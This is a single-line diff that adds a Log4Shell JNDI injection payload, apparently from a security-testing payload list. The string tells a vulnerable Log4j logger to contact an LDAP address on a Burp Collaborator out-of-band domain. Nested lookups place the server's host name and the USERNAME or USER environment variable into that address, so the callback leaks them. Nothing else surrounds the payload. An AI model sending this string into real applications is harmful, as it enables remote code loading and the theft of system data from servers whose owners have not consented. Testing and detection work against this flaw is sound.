@@ -1,0 +1,1 @@
+${jndi:ldap://u${hostName}-s2u-${env:USERNAME:-${env:USER}}.z2201tefippuwb4diod6ot08wz2vwskh.burpcollaborator.net:99999/s2test}
